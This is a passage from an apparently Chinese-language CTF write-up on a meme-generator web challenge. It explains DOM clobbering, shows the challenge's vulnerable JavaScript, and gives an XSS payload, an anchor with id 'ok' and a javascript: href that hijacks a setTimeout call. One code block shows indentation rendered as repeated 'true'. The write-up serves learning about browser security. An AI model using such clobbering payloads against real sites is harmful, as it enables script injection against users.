class="line">    <span class="hljs-string">`&lt;style&gt;@import url(&apos;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&apos;);`</span> +</span><br><span class="line">    <span class="hljs-string">`.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`</span> +</span><br><span class="line">    <span class="hljs-string">`.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`</span> +</span><br><span class="line">    <span class="hljs-string">`position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`</span> +</span><br><span class="line">    <span class="hljs-string">`&lt;div class=&quot;meme-card&quot;&gt;&lt;img src=&quot;<span class="hljs-subst">${img}</span>&quot;&gt;&lt;h1&gt;<span class="hljs-subst">${text}</span>&lt;/h1&gt;&lt;/div&gt;`</span></span><br><span class="line">  );</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7528;&#x6765;&#x5C06;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684; img &amp; text &#x53C2;&#x6570;&#x6784;&#x9020;&#x4E00;&#x4E2A; HTML &#x6A21;&#x7248;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (text &amp;&amp; img) {</span><br><span class="line">    template = memeTemplate(img, text);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (notify) {</span><br><span class="line">      html = <span class="hljs-string">`&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;&lt;b&gt;Meme&lt;/b&gt; created from <span class="hljs-subst">${DOMPurify.sanitize(</span></span></span><br><span class="line"><span class="hljs-string"><span class="hljs-subst">        text</span></span></span><br><span class="line"><span class="hljs-string"><span class="hljs-subst">      )}</span>&lt;/div&gt;`</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span><br><span class="line">      $(<span class="hljs-string">&quot;#status&quot;</span>).remove();</span><br><span class="line">      notify ? $(<span class="hljs-string">&quot;#notify&quot;</span>).html(html) : <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="line">      $(<span class="hljs-string">&quot;#meme-code&quot;</span>).text(template);</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7528;&#x6765;&#x8FDB;&#x884C; DOM &#x5143;&#x7D20;&#x64CD;&#x4F5C;&#x7B49;&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#x5C31;&#x662F;<code>setTimeout</code>&#x51FD;&#x6570;&#x4E2D;&#x901A;&#x8FC7;<code>$(&quot;#notify&quot;).html(html)</code>&#x6765;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x628A; notify &#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3A; true&#x3002;</p><h3 id="DOM-Clobbering"><a href="#DOM-Clobbering" class="headerlink" title="DOM Clobbering"></a>DOM Clobbering</h3><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x770B;&#x770B;&#x51E0;&#x4E2A;&#x6BD4;&#x8F83;&#x6709;&#x8DA3;&#x7684;&#x4F8B;&#x5B50;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png" alt></p><p>&#x6839;&#x636E; MDN &#x6587;&#x6863;</p><blockquote><p>&#x200B;    The <strong><code>domain</code></strong> property of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document" target="_blank" rel="noopener"><code>Document</code></a> interface gets/sets the domain portion of the origin of the current document, as used by the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">same origin policy</a>.</p></blockquote><p>&#x8FD9;&#x91CC;&#x7684;<code>document.domain</code>&#x5E76;&#x6CA1;&#x6709;&#x83B7;&#x53D6;&#x5230;&#x6211;&#x7684;&#x57DF;&#x540D;<code>zedd.vv</code>&#xFF0C;&#x53CD;&#x800C;&#x662F;&#x83B7;&#x53D6;&#x5230;&#x4E86; img &#x6807;&#x7B7E;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8F93;&#x51FA; document &#x5BF9;&#x8C61;&#x6765;&#x770B;&#x770B;&#x662F;&#x600E;&#x4E48;&#x56DE;&#x4E8B;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png" alt></p><p>&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x4F8B;&#x5B50;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x6807;&#x7B7E;&#x7684; id(name) &#x5C5E;&#x6027;&#x6765;&#x63A7;&#x5236; document(window) &#x901A;&#x8FC7; DOM API(BOM API) &#x83B7;&#x53D6;&#x5230;&#x7684;&#x67D0;&#x4E2A;&#x4E1C;&#x897F;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png" alt></p><p>&#x6211;&#x67E5;&#x9605;&#x8FC7;&#x76F8;&#x5173;&#x8D44;&#x6599;&#xFF0C;&#x4E5F;&#x8BE2;&#x95EE;&#x8FC7;&#x4E00;&#x4E9B;&#x524D;&#x7AEF;&#x7684;&#x4E13;&#x4E1A;&#x4EBA;&#x5458;&#xFF0C;&#x8FD9;&#x91CC;&#x7ED9;&#x6211;&#x7684;&#x89E3;&#x91CA;&#x662F;&#x201D;document &#x548C; window &#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x5176;&#x5B9E;&#x662F; DOM &#x548C; BOM &#x7684;&#x89C4;&#x8303;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x8FD9;&#x4E24;&#x4E2A;&#x4E0D;&#x5E94;&#x8BE5;&#x88AB;&#x5F53;&#x505A;&#x666E;&#x901A;&#x7684; JS &#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F;&#x89C4;&#x8303;&#x4E0E;&#x5B9E;&#x73B0;&#x4E0D;&#x540C;&#x201D;&#xFF0C;&#x201D;&#x90FD;&#x662F;&#x56E0;&#x4E3A;&#x4E0A;&#x53E4;&#x9057;&#x7559;&#x95EE;&#x9898;&#xFF0C;&#x73B0;&#x5728;&#x54EA;&#x6709;&#x76F4;&#x63A5;&#x5199; document.xxx &#x6765;&#x83B7;&#x53D6;&#x5143;&#x7D20;&#x7684;&#xFF0C;TS &#x548C; eslint &#x90FD;&#x4F1A;&#x62A5;&#x9519;&#x201D;&#x3002;</p><p>&#x8FD9;&#x79CD;&#x64CD;&#x4F5C;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">dom-clobbering</a>&#xFF0C;&#x4E0D;&#x7B97;&#x662F;&#x65B0;&#x7684;&#x653B;&#x51FB;&#x624B;&#x6CD5;&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x6548;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528;&#x8FD9;&#x79CD; Trick &#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;&#x3002;</p><h3 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h3><p>&#x6211;&#x4EEC;&#x4E86;&#x89E3;&#x4E86; Dom Clobbering &#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x770B;&#x770B;&#x53EF;&#x4EE5;&#x600E;&#x4E48;&#x901A;&#x8FC7;<code>setTimeout</code>&#x6765;&#x5229;&#x7528;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    a.innerHTML = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;b&apos;</span>);</span></span><br><span class="line">    setTimeout(ok, 2000)</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B80;&#x5316;&#x4E86;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#x4EE3;&#x7801;&#xFF0C;&#x5BF9;&#x4E8E;&#x4EE5;&#x4E0A;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528; Dom Clobbering &#x6765;&#x5B9E;&#x73B0; XSS &#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F20;&#x5165; id &#x4E3A; ok &#x7684;&#x6807;&#x7B7E;&#x8FDB;&#x884C; XSS &#xFF0C;&#x4F8B;&#x5982;&#x4F20;&#x5165;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">ok</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x6839;&#x636E; MDN &#x6587;&#x6863;&#xFF0C;<code>setTimeout</code>&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5FC5;&#x987B;&#x662F;&#x4E2A;&#x51FD;&#x6570;&#x6216;&#x5B57;&#x7B26;&#x4E32;&#x3002;&#x53EF;&#x662F;&#x6839;&#x636E; Dom Clobbering &#xFF0C;&#x8FD9;&#x91CC;&#x7684;<code>ok</code>&#x5E94;&#x8BE5;&#x662F;&#x4E00;&#x4E2A; a &#x6807;&#x7B7E;&#xFF0C;&#x65E2;&#x7136;&#x8FD9;&#x4E0D;&#x662F;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x5B83;&#x5C31;&#x5C1D;&#x8BD5;&#x7528;<code>toString</code>&#x65B9;&#x6CD5;&#x8F6C;&#x6362;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x800C;&#x6839;&#x636E; MDN &#x6587;&#x6863; <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement" target="_blank" rel="noopener">HTMLAnchorElement</a></p><blockquote><p>&#x200B;    <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/toString" target="_blank" rel="noopener"><code>HTMLHyperlinkElementUtils.toString()</code></a></p><p>Returns a <a href="https://developer.mozilla.org/en-US/docs/Web/API/USVString" target="_blank" rel="noopener"><code>USVString</code></a> containing the whole URL. It is a synonym for <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/href" target="_blank" rel="noopener"><code>HTMLHyperlinkElementUtils.href</code></a>, though it can&#x2019;t be used to modify the value.</p></blockquote><p>&#x800C;&#x5F53; a &#x6807;&#x7B7E;&#x901A;&#x8FC7;<code>toString()</code>&#x65B9;&#x6CD5;&#x8F6C;&#x6362;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x5B83;&#x7684; href &#x5C5E;&#x6027;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;<code>javascript:alert()</code>&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x4E86;&#x3002;</p><h3 id="notify"><a href="#notify" class="headerlink" title="notify"></a>notify</h3><p>&#x597D;&#x4E86;&#xFF0C;&#x56DE;&#x5230;&#x6211;&#x4EEC;&#x7684; notify &#x4E0A;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; DOM Clobbering &#x8FDB;&#x884C;&#x201C;&#x6C61;&#x67D3;&#x201D;&#x4E00;&#x4E9B;&#x53C2;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x9898;&#x76EE;&#x76F4;&#x63A5;&#x89C4;&#x5B9A;&#x4E86;<code>let notify = false</code>&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x5F53;&#x7136;&#x4E5F;&#x4E0D;&#x53EF;&#x80FD;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x4FEE;&#x6539;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x8FD9;&#x53EF;&#x600E;&#x4E48;&#x529E;&#xFF1F;</p><p>&#x5176;&#x5B9E;&#x8FD9;&#x91CC;&#x7684; notify &#x6BD4;&#x8F83;&#x5177;&#x6709;&#x8BEF;&#x5BFC;&#x6027;&#xFF0C;&#x6BD4;&#x8F83;&#x50CF; C &#x8BED;&#x8A00;&#x5165;&#x95E8;&#x7684;&#x65F6;&#x5019;&#x51FD;&#x6570;&#x4F20;&#x53C2;&#x90E8;&#x5206;&#xFF0C;&#x6211;&#x4EEC;&#x628A;&#x6574;&#x4E2A;&#x4EE3;&#x7801;&#x6539;&#x4E00;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span></span><br><span class="line">truetruetruetrueif (text &amp;&amp; img) {</span><br><span class="line">truetruetruetruetruetemplate = memeTemplate(img, text);</span><br><span class="line">truetruetruetruetrueif (notify) {</span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-comment">//...</span></span></span><br><span class="line">truetruetruetruetrue}</span><br><span class="line">truetruetruetrue}</span><br><span class="line">truetruetrue};</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">/* Main */</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;text&quot;</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;img&quot;</span>);</span></span><br><span class="line">  if (text &amp;&amp; img) {</span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">document</span>.write(</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">      `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;status&quot;</span>&gt;</span>` +</span></span></span><br><span class="line"><span class="hljs-actionscript">      `&lt;img <span class="hljs-class"><span 